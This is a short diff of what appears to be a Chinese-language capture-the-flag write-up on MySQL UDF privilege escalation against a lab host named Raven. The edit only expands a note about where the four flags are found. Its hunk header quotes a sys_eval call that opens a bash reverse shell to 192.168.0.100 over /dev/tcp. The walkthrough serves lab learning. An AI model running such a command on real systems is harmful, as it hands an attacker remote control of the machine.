@@ -1330,7 +1330,7 @@ mysql> select sys_eval("bash -c 'exec bash -i &>/dev/tcp/192.168.0.100/5555 <&1'
 <img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/6.png" width="56%">
 
 <details>
-<summary>7. 至于flag，大家自己找吧，我知道的应该就4个:</summary>
+<summary>7. 至于flag，大家自己找吧，我知道的应该就4个:(第三个是一个图片，因此需要用浏览器加载出来)</summary>
 
 ```shell
 root@Raven:/var/www/html/vendor# cat PATH
